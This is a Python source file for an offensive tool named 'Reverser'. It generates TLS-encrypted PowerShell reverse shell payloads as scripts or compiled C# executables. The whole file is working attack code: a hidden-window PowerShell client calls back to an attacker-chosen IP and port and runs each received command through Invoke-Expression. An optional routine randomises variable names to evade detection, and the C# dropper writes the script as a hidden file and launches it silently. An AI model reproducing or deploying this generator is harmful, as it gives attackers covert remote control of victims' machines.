import os
import subprocess
import argparse
import random

def print_banner():
    banner = """\033[91m
 ____                                   
|  _ \ _____   _____ _ __ ___  ___ _ __ 
| |_) / _ \ \ / / _ \ '__/ __|/ _ \ '__|
|  _ <  __/\ V /  __/ |  \__ \  __/ |   
|_| \_\___| \_/ \___|_|  |___/\___|_|   

@ShkudW
\033[0m"""
    print(banner)
    print("\033[96mGitHub: https://github.com/ShkudW/Reverser\033[0m")

def generate_certificate(cert_file, key_file):
    try:
        subprocess.run([
            "openssl", "req", "-new", "-newkey", "rsa:4096", "-days", "365", "-nodes",
            "-x509", "-subj", "/CN=www.welcome.corp",
            "-keyout", key_file, "-out", cert_file
        ], check=True)
        print(f"\033[92mCertificate and key generated and saved to {cert_file} and {key_file}\033[0m")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred during certificate creation: {e}")
        raise

def obfuscate_randomly(content):
    replacements = [
        ("$client", "$" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=7))),
        ("$stream", "$" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=7))),
        ("$sslStream", "$" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=7))),
        ("$reader", "$" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=7))),
        ("$writer", "$" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=7)))
    ]
    for old, new in replacements:
        content = content.replace(old, new)
    return content

def generate_ps1(ip, port, cert_file, output_file, randomize=False):
    ps1_content = f"""powershell.exe -WindowStyle Hidden -Command
$c1i3nt = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$str3am = $c1i3nt.GetStream();
$ss1Str3am = New-Object System.Net.Security.SslStream($str3am, $false,
    {{
        param (
            $sender,
            [System.Security.Cryptography.X509Certificates.X509Certificate]$cert,
            [System.Security.Cryptography.X509Certificates.X509Chain]$chain,
            [System.Net.Security.SslPolicyErrors]$sslPolicyErrors
        )
        return $true;
    }}, $null);
$ss1Str3am.AuthenticateAsClient("{ip}", $null, [System.Security.Authentication.SslProtocols]::Tls12, $false);
$r3ad3r = New-Object System.IO.StreamReader($ss1Str3am);
$wr1t3r = New-Object System.IO.StreamWriter($ss1Str3am);
$wr1t3r.AutoFlush = $true;
$wr1t3r.WriteLine("Connection established successfully.");
while($true) {{
    $command = $r3ad3r.ReadLine();
    if ($command -eq "exit") {{ break; }}
    $currentDir = (Get-Location).Path + "> ";
    $output = $currentDir + (Invoke-Expression $command | Out-String);
    $wr1t3r.WriteLine($output);
    $wr1t3r.Flush();
}}
$ss1Str3am.Close();
$c1i3nt.Close();
    """
    if randomize:
        ps1_content = obfuscate_randomly(ps1_content)
    
    with open(output_file, 'w') as file:
        file.write(ps1_content.strip())
    print(f"\033[92mPowerShell script saved to {output_file}\033[0m")

def generate_exe(ip, port, cert_file, output_file, randomize=False):
    ps1_content = f""" 
$c1i3nt = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$str3am = $c1i3nt.GetStream();
$ss1Str3am = New-Object System.Net.Security.SslStream($str3am, $false,
{{
    param (
        $sender,
        [System.Security.Cryptography.X509Certificates.X509Certificate]$cert,
        [System.Security.Cryptography.X509Certificates.X509Chain]$chain,
        [System.Net.Security.SslPolicyErrors]$sslPolicyErrors
    )
    return $true;
}}, $null);
$ss1Str3am.AuthenticateAsClient('{ip}', $null, [System.Security.Authentication.SslProtocols]::Tls12, $false);
$r3ad3r = New-Object System.IO.StreamReader($ss1Str3am);
$wr1t3r = New-Object System.IO.StreamWriter($ss1Str3am);
$wr1t3r.AutoFlush = $true;
$wr1t3r.WriteLine("Connection established successfully.");
while ($true) {{
    $command = $r3ad3r.ReadLine();
    if ($command -eq 'exit') {{ break; }}
    $currentDir = (Get-Location).Path + '> ';
    $output = $currentDir + (Invoke-Expression $command | Out-String);
    $wr1t3r.WriteLine($output);
    $wr1t3r.Flush();
}}
$ss1Str3am.Close();
$c1i3nt.Close();
    """
    
    if randomize:
        ps1_content = obfuscate_randomly(ps1_content)

    # Replace quotes with escaped quotes and newlines with spaces
    escaped_ps1_content = ps1_content.replace('"', '\\"').replace('\n', ' ')

    cs_content = f"""
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

class Program
{{
    static void Main(string[] args)
    {{
        // Define the content of the PS1 script
        string ps1Content = "{escaped_ps1_content}";
        // Save the PS1 content to a file
        string filePath = Path.Combine(Directory.GetCurrentDirectory(), "reception.ps1");
        File.WriteAllText(filePath, ps1Content);

        
        File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);

        
        Process proc3ss = new Process();
        proc3ss.StartInfo.FileName = "cmd.exe";
        proc3ss.StartInfo.Arguments = "/c start powershell.exe -WindowStyle Hidden -File reception.ps1";
        proc3ss.StartInfo.CreateNoWindow = true;
        proc3ss.StartInfo.UseShellExecute = false;
        proc3ss.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
        proc3ss.Start();

        // Wait for 2 seconds
        Thread.Sleep(2000);

        
        proc3ss.CloseMainWindow();
    }}
}}
    """

    cs_file = output_file.replace('.exe', '.cs')
    with open(cs_file, 'w') as file:
        file.write(cs_content.strip())

    print(f"\033[92mC# code saved to {cs_file}\033[0m")
    print("Compiling C# code to EXE...")

    subprocess.run(["mcs", cs_file, "-out:" + output_file])
    os.remove(cs_file)
    print(f"\033[92mExecutable saved to {output_file}\033[0m")

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="Generate a reverse shell with SSL encryption.")
    parser.add_argument("-ip", type=str, required=True, help="IP address for the reverse shell")
    parser.add_argument("-port", type=int, required=True, help="Port for the reverse shell")
    parser.add_argument("-type", type=str, choices=["ps1", "exe"], required=True, help="Type of payload to generate (ps1/exe)")
    parser.add_argument("-random", action="store_true", help="Randomize obfuscation")

    args = parser.parse_args()

    cert_file = "reception.pem"
    key_file = "reception.key"

    generate_certificate(cert_file, key_file)

    if args.type == "ps1":
        output_file = "reception.ps1"
        generate_ps1(args.ip, args.port, cert_file, output_file, randomize=args.random)
    elif args.type == "exe":
        output_file = "reception.exe"
        generate_exe(args.ip, args.port, cert_file, output_file, randomize=args.random)

    print(f"\033[96mTo start an OpenSSL listener, run:\n\033[92mopenssl s_server -accept {args.port} -cert {cert_file} -key {key_file} -quiet\033[0m")

